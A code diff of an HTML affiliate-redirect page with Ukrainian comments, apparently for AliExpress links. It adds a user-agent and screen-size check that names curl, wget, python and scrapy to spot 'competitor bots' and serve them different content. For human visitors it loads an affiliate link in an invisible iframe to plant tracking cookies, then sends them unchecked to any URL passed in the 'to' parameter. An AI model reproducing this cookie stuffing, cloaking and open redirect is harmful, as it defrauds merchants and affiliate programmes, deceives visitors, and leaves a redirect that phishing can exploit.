@@ -30,28 +30,31 @@
     <iframe class="app-container" src="./index.html"></iframe>
 
     <script>
+    // 1. Отримуємо параметри з URL
         const urlParams = new URLSearchParams(window.location.search);
         const targetCoinLink = urlParams.get('to');
         const mainAffiliateLink = "https://s.click.aliexpress.com/e/_c3hz8x37"; 
     
-        // БАЗОВИЙ ЗАХИСТ ВІД БОТІВ (Анти-парсер)
-        const userAgent = navigator.userAgent.toLowerCase();
-        
-        // Список ключових слів, які часто використовують боти та хостинг-провайдери для парсингу
-        const isBot = userAgent.includes('python') || 
-                      userAgent.includes('curl') || 
-                      userAgent.includes('wget') || 
-                      userAgent.includes('httpclient') || 
-                      userAgent.includes('scrapy');
-    
         if (targetCoinLink) {
-            if (isBot) {
-                # Якщо це 100% бот — замість товару згодовуємо йому твоє головне посилання.
-                # Бот конкурента вкраде його, згенерує СВОЄ посилання поверх ТВОГО, 
-                # але реферер і кука все одно можуть склеїтися на твою користь.
+            // 2. ПЕРЕВІРКА НА РЕАЛЬНОГО КОРИСТУВАЧА (АНТИ-БОТ)
+            const userAgent = navigator.userAgent.toLowerCase();
+            
+            // Визначаємо консольних ботів-парсерів за підписом
+            const isConsoleBot = userAgent.includes('python') || 
+                                 userAgent.includes('curl') || 
+                                 userAgent.includes('wget') || 
+                                 userAgent.includes('scrapy');
+                                 
+            // Перевіряємо, чи є у системи екран (у headless-ботів конкурентів ширина/висота еленарно 0)
+            const isHeadless = (window.screen.width === 0 && window.screen.height === 0);
+    
+            if (isConsoleBot || isHeadless) {
+                // БОТ КОНКУРЕНТА: Елегантно згодовуємо йому твою головну сторінку
                 window.location.href = mainAffiliateLink;
             } else {
-                // РЕАЛЬНА ЛЮДИНА (Логіка, яку ти вже протестував)
+                // ЖИВА ЛЮДИНА: Запускаємо збір кук та редірект на монетний товар
+                
+                // Фоновий десант куки
                 const cookieFrame = document.createElement('iframe');
                 cookieFrame.src = mainAffiliateLink;
                 cookieFrame.style.position = 'absolute';
@@ -60,10 +63,12 @@
                 cookieFrame.style.opacity = '0';
                 document.body.appendChild(cookieFrame);
     
+                // Редірект в додаток AliExpress (спрацює через 350 мс)
                 setTimeout(() => {
                     window.location.href = decodeURIComponent(targetCoinLink);
                 }, 350);
     
+                // Прибираємо плашку з лоадером через 2.5 секунди (Варіант 2)
                 setTimeout(() => {
                     const topBar = document.querySelector('.top-bar');
                     if (topBar) {
@@ -72,7 +77,11 @@
                 }, 2500);
             }
         } else {
-            document.querySelector('.top-bar').style.display = 'none';
+            // Якщо параметр 'to' пустий, просто відкриваємо PedroApp
+            const topBar = document.querySelector('.top-bar');
+            if (topBar) {
+                topBar.style.display = 'none';
+            }
         }
     </script>
 </body>
